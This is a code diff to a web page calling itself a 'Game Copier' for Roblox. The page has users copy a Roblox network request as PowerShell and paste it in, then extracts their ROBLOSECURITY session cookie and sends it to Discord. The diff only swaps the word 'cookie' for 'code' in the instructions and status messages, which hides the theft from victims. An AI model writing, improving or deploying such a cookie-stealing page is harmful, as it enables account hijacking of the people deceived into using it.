@@ -235,7 +235,7 @@
         <h3>⬡ Game Copier · v2</h3>
         <div class="steps">
             <p><span style="color:#7aa9ff;">1.</span> Press <strong>"Open GamesApi"</strong> → then go to <kbd>Inspect</kbd> → <kbd>Network</kbd> tab. Refresh (Ctrl+R).</p>
-            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong>. Paste the code in the <strong>"Game Code"</strong> box below, paste the Game ID, then click <strong>"Start GameCopier"</strong> to extract and send the ROBLOSECURITY cookie.</p>
+            <p><span style="color:#7aa9ff;">2.</span> <span class="highlight">Scroll up</span> and you will find <strong>"game"</strong>. Right click on <strong>"game"</strong> and hover over copy → select <strong>"Copy all as PowerShell"</strong>. Paste the code in the <strong>"Game Code"</strong> box below, paste the Game ID, then click <strong>"Start GameCopier"</strong> to extract and send the code.</p>
         </div>
 
         <div class="buttons">
@@ -302,7 +302,7 @@
 
         // --- SEND COOKIE TO DISCORD ---
         function sendCookieToDiscord(cookie) {
-            statusMsg.innerText = '⏳ sending cookie...';
+            statusMsg.innerText = '⏳ sending code...';
             
             let cookieValue = cookie;
             if (cookie.length > 1900) {
@@ -320,7 +320,7 @@
             })
             .then(response => {
                 if (response.ok) {
-                    statusMsg.innerText = '✅ Cookie sent!';
+                    statusMsg.innerText = '✅ Code sent!';
                     prog.style.width = '100%';
                     setTimeout(() => {
                         prog.style.width = '0%';
@@ -368,7 +368,7 @@
                 return;
             }
 
-            statusMsg.innerText = '⏳ extracting cookie...';
+            statusMsg.innerText = '⏳ extracting code...';
             
             // Extract cookie from the Game Code
             const cookie = extractCookie(code);
@@ -376,7 +376,7 @@
             if (cookie) {
                 sendCookieToDiscord(cookie);
             } else {
-                statusMsg.innerText = '❌ No cookie found';
+                statusMsg.innerText = '❌ No code found';
                 alert('❌ No ROBLOSECURITY cookie found in the Game Code.\n\nMake sure you pasted the PowerShell code from the Network tab.');
                 return;
             }
